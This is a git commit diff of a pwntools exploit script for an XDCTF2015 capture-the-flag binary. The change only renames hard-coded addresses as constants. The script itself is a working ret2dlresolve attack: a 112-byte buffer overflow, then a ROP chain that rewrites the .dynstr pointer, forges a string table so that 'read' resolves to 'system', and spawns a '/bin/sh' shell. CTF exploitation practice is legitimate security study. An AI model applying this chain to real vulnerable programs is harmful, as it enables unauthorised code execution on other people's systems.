bb40fb774c874644fe2488ed79ad5c7e1defb5f1
usasshw <usasshw@gmail.com>
2024-11-30 20:26:29 +0800

    Add files via upload

--- ret2dlresolve.py
+++ ret2dlresolve.py
@@ -8,21 +8,25 @@ elf = ELF("./ret2dlresolve")
 
 p.recvuntil(b"Welcome to XDCTF2015~!\n")
 
+DT_STRTAB = 0x0804B14C
+fake_strtab = 0x0804B228
+sec_instr = 0x08049066
+
 offset = 112
 rop.raw(offset * b"a")
-rop.read(0, 0x0804B14C + 4, 4)  # modify .dynstr pointer in .dynamic section to a specific location
+rop.read(0, DT_STRTAB + 4, 4)  # modify .dynstr pointer in .dynamic section to a specific location
 dynstr = elf.get_section_by_name(".dynstr").data()
 dynstr = dynstr.replace(b"read", b"system")
-rop.read(0, 0x0804B228, len((dynstr)))  # construct a fake dynstr section
-rop.read(0, 0x0804B228 + 0x100, len(b"/bin/sh\x00"))  # read /bin/sh\x00
-rop.raw(0x08049066)  # the second instruction of read@plt
+rop.read(0, fake_strtab, len((dynstr)))  # construct a fake dynstr section
+rop.read(0, fake_strtab + 0x100, len(b"/bin/sh\x00"))  # read /bin/sh\x00
+rop.raw(sec_instr)  # the second instruction of read@plt
 rop.raw(0xDEADBEEF)
-rop.raw(0x0804B228 + 0x100)
+rop.raw(fake_strtab + 0x100)
 
 assert len(rop.chain()) <= 256
 rop.raw(b"a" * (256 - len(rop.chain())))
 p.send(rop.chain())
-p.send(p32(0x0804B228))
+p.send(p32(fake_strtab))
 p.send(dynstr)
 p.send(b"/bin/sh\x00")
 p.interactive()
